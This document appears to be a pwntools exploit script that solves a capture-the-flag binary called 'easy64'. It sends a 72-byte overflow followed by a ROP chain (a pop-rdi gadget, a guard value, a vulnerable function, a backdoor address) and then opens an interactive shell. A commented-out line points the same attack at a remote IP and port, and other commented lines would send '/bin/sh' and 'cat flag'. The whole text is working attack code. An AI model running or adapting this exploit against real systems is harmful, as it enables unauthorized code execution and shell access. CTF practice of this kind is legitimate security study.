from pwn import *
from time import sleep

# context.terminal = ['wt.exe', 'wsl.exe', '-d', 'debian', '--', 'bash',]

# conn = remote("81.68.214.63", 15001)
# conn = process('easy64')
conn = process('./easy64')

print(conn.readline())
main = 0x4007AC
backdoor = 0x400737
vul = 0x400768
guard = 114
rdi_ret = 0x4008A3
ret = 0x4008A4
# payload = b'\x90' * 72 + p64(ret) + p64(rdi_ret) + p64(guard) + p64(vul) + p64(ret) + p64(backdoor) 

payload = b'\x90' * 72  + p64(rdi_ret) + p64(guard) + p64(vul) +  p64(backdoor) 
conn.sendline(payload)
print(conn.readuntil(b'?'))
# conn.sendline(b"/bin/sh")
# conn.sendline(b'cat flag')
conn.interactive()
